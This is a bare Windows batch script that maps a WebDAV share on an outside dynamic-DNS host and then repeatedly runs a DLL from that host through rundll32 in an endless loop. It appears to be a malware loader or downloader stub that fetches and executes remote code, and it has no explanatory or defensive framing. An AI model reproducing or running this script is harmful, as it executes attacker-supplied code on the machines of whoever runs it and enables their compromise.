@echo off
timeout 60
net use B: \\jajaja.servehttp.com\webdav /persistent:no
net use B: /delete
:start
rundll32.exe \\jajaja.servehttp.com\webdav\Win32.dll,Run
timeout 10
goto start
